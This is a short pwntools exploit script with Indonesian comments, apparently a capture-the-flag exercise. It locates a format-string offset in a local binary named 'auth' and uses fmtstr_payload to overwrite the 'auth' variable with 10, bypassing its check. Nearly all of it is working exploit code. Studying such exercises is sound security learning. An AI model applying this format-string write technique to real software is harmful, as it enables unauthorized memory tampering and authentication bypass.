from pwn import *
elf = context.binary = ELF("./auth")

def send_payload(payload): #untuk dimasukkan di class FmtStr, dan akan dijalankan setiap saat dengan mengirim payload dari bawaan fmtstr, dan mengecek %1$p, %2$p, %3$p, hinggan menemukan %offset$p yang sama dengan payload, disini 7 offset nya
    p = elf.process()
    p.sendline(payload)
    l = p.recvall().strip()
    print(f"PAYLOAD NYA = {payload}")
    print(f"HASILNYA = {l}")
    p.close()
    return l

offset = FmtStr(send_payload).offset
info(f"{offset=}")

# Setelah menemukan offset nya kita bisa mengirimkan lokasi yang ingin kita tuju dan value yang ingin kita tulis

p = process()
payload = fmtstr_payload(offset, {elf.sym['auth']: 10})
print(f"payload kita dari fmtstr_payload = {payload}")
p.sendline(fmtstr_payload(offset, {elf.sym['auth']: 10})) # fmtstr_payload adalah pembuat payload otomatis
print(f" ya ya, apakah BERHASIL ? ::: {p.recvall().strip()}")
print((fmtstr_payload(offset, {elf.sym['auth']: 10},no_dollars=True)))
print(hex(elf.sym['auth']))
